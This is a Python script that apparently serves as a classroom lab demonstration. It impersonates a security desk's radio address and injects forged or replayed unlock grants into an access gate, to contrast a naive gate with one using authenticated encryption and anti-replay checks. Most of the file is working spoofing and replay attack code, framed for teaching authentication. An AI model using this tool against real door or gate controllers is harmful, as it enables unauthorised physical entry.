#!/usr/bin/env python3
"""Inject a forged unlock grant into an access gate to teach authentication.

Spoof.py is the classroom data-injection demonstration. It claims the
security desk address on the physical transceiver and transmits a crafted
grant to the victim gate. Against the naive gate the forged grant opened
the deadbolt; against the hardened gate the same attack fails twice over.
The envelope cannot be authenticated because the spoofing tool holds no
field key, and even a captured grant that did authenticate would be
rejected by the monotonic anti-replay window.
"""

import argparse
import secrets
import sys
import time

import field_crypto

try:
    import serial
except ImportError as exc:
    raise SystemExit(
        "pip install pyserial to run the ACCESS_GATE spoof tool"
    ) from exc

HUB_ADDRESS = "0001"
NONCE_LEN = 24
TAG_LEN = 16
KEY_LEN = 32


def _parse_args():
    """Parse spoof tool command-line arguments.

    Parameters
    ----------
    None

    Returns
    -------
    argparse.Namespace
        Parsed spoof tool arguments.
    """
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--port", required=True, help="Serial port device")
    parser.add_argument("--baud", type=int, default=115200,
                        help="Radio baud rate")
    _add_forge_args(parser)
    return parser.parse_args()


def _add_forge_args(parser):
    """Add the forged grant and attack-mode options.

    Parameters
    ----------
    parser : argparse.ArgumentParser
        Parser receiving the forged field options.

    Returns
    -------
    None
    """
    parser.add_argument("--victim", required=True,
                        help="Victim gate address in hex")
    parser.add_argument("--seq", type=int, default=1,
                        help="Forged grant sequence number")
    parser.add_argument("--mode", choices=("bad-tag", "replay"),
                        default="bad-tag",
                        help="Forged sealed grant or captured replay")
    parser.add_argument("--capture",
                        help="Captured hex grant to replay in replay mode")


def _le32(value):
    """Encode an integer as four little-endian bytes.

    Parameters
    ----------
    value : int
        Unsigned value to encode.

    Returns
    -------
    bytes
        Four little-endian bytes.
    """
    return value.to_bytes(4, "little")


def _grant_body(seq):
    """Build a forged grant body of sequence and random tag bytes.

    Parameters
    ----------
    seq : int
        Forged grant sequence number.

    Returns
    -------
    bytes
        Twenty-byte forged grant body.
    """
    return _le32(seq) + secrets.token_bytes(TAG_LEN)


def _forged_envelope(body):
    """Wrap a forged body in a plausible but unauthenticated envelope.

    Parameters
    ----------
    body : bytes
        Forged grant body.

    Returns
    -------
    str
        Lowercase hex nonce, ciphertext, and random tag bytes.
    """
    key = secrets.token_bytes(KEY_LEN)
    nonce = secrets.token_bytes(NONCE_LEN)
    ct, tag = field_crypto._xchacha_seal(key, nonce, field_crypto.FIELD_AD,
                                         body)
    return (nonce + ct + tag).hex()


def _set_spoof_address(ser, address):
    """Claim an address on the local transceiver.

    Parameters
    ----------
    ser : serial.Serial
        Open radio serial connection.
    address : str
        Address to claim in hex.

    Returns
    -------
    None
    """
    cmd = f"AT+ADDRESS={int(address, 16)}\r\n".encode("utf-8")
    ser.write(cmd)
    ser.flush()


def _send_spoof(ser, victim, payload):
    """Transmit the forged grant to the victim gate.

    Parameters
    ----------
    ser : serial.Serial
        Open radio serial connection.
    victim : str
        Victim gate address in hex.
    payload : str
        Forged frame text, either a broken envelope or a replay.
    Returns
    -------
    None
    """
    cmd = f"AT+SEND={victim},{len(payload)},{payload}\r\n"
    ser.write(cmd.encode("utf-8"))
    ser.flush()


def _frame(args):
    """Build the forged wire frame for the selected attack mode.

    Parameters
    ----------
    args : argparse.Namespace
        Parsed spoof tool arguments.

    Returns
    -------
    str
        Forged frame text sent to the victim gate.
    """
    if args.mode == "replay":
        return args.capture or ""
    return _forged_envelope(_grant_body(args.seq))


def main():
    """Inject the forged grant under the security desk address.

    Parameters
    ----------
    None

    Returns
    -------
    int
        Zero on successful injection.
    """
    args = _parse_args()
    frame = _frame(args)
    with serial.Serial(args.port, args.baud, timeout=1.0) as ser:
        _set_spoof_address(ser, HUB_ADDRESS)
        time.sleep(0.2)
        _send_spoof(ser, args.victim, frame)
    print(f"Injected forged {args.mode} grant as the desk to gate "
          f"0x{args.victim}")
    print("The gate rejects it because the spoof tool holds no field key "
          "and cannot seal a valid envelope.")
    print("A captured grant that did authenticate is still refused by the "
          "monotonic anti-replay window.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
